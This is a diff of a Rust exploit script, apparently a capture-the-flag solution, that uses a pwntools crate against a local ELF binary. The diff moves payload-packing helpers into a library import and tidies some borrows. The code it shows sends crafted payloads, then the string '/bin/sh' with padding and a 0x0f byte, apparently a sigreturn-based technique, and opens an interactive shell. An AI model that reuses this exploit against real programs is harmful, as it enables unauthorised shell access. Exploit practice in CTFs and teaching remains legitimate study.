@@ -1,59 +1,11 @@
 use clap::Clap;
-use pwntools::{process::Process, pwn::*};
-use std::{
-    io,
-    ops::{AddAssign, Mul},
-    time, usize,
-};
+use pwntools::{process::Process, pwn::*, util::*};
+use std::{io, time};
 
 #[derive(Clap)]
 struct Opts {
     elf_file: String,
 }
-
-#[derive(Debug, Clone, Default)]
-struct Payload {
-    data: Vec<u8>,
-}
-
-impl AddAssign<P64> for Payload {
-    fn add_assign(&mut self, rhs: P64) {
-        self.data.extend_from_slice(&rhs.0.to_le_bytes())
-    }
-}
-
-impl AddAssign<&[u8]> for Payload {
-    fn add_assign(&mut self, rhs: &[u8]) {
-        self.data.extend_from_slice(rhs)
-    }
-}
-
-impl AddAssign<Vec<u8>> for Payload {
-    fn add_assign(&mut self, rhs: Vec<u8>) {
-        self.data.extend_from_slice(&rhs)
-    }
-}
-
-impl Mul<usize> for P64 {
-    type Output = Vec<u8>;
-
-    fn mul(self, rhs: usize) -> Self::Output {
-        self.0.to_le_bytes().repeat(rhs)
-    }
-}
-
-impl Payload {
-    pub fn ljust(&mut self, size: usize, value: u8) {
-        self.data.resize(size, value)
-    }
-
-    pub fn as_bytes(&self) -> &[u8] {
-        &self.data
-    }
-}
-
-struct P64(u64);
-
 fn main() -> io::Result<()> {
     let opts: Opts = Opts::parse();
 
@@ -74,7 +26,7 @@ fn main() -> io::Result<()> {
     conn.sendline(payload.as_bytes())?;
     std::thread::sleep(time::Duration::from_millis(100));
 
-    conn.sendline(&format!("{}", ret).as_bytes())?;
+    conn.sendline(format!("{}", ret).as_bytes())?;
     std::thread::sleep(time::Duration::from_millis(100));
 
     let mut payload = Payload::default();
@@ -100,7 +52,7 @@ fn main() -> io::Result<()> {
     conn.sendline(payload.as_bytes())?;
     std::thread::sleep(time::Duration::from_millis(100));
 
-    conn.send(&format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())?;
+    conn.send(format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())?;
     conn.interactive()?;
 
     Ok(())
